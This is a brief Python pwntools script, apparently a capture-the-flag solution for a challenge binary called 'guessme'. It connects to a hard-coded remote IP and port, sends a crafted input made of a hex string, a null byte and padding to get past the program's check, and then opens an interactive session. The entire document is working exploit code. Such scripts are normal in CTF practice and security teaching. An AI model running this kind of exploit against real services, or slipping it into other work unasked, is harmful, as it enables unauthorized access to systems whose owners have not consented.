from pwn import *

r = remote("125.235.240.166", 20102)
# r = process("./guessme")

payload = "75ddc807\x00"
payload += (30 - len(payload))*"1"
payload += "1111" 
r.sendline(payload)
r.interactive()